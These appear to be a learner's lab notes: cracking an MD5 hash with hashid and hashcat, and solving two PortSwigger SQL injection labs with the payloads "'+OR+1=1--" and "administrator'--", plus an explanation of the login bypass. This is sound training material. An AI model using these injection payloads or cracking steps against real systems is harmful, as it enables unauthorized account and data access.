# Hash

## Hash Identification
```bash
$ hashid 5fcfd41e547a12215b173ff47fdd3739                                                                                                                       [17:36:12]

Analyzing '5fcfd41e547a12215b173ff47fdd3739'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```
***Result***: Hash Algorithm: MD5

## Cracking the Hash
```bash
$ hashcat -m 0 ../../artifacts/hash.txt --show                                                                                                                  [17:56:41]
5fcfd41e547a12215b173ff47fdd3739:trustno1
```

## Results

* **Hash:** `5fcfd41e547a12215b173ff47fdd3739`
* **Cracked Password:** `trustno1`
* **Time Taken:** 1 second

## 5. Takeaways
`rockyou.txt` file is freaking huge.


# PortSwigger

## Lab-1
The vulnurability (SQL Injection) is to be done in the URL path itself. Add this in the end -
```
'+OR+1=1--
```

## Lab-2
Type this SQL Payload in the username block of the form -
```
administrator'--
```

## Working
- `--` is the SQL comment indicator, telling the database to ignore the rest of the line
- `'` closes the string, essentially making it something like `username = 'administrator'`, and then the `--` will ask the SQL to skip the password checking part

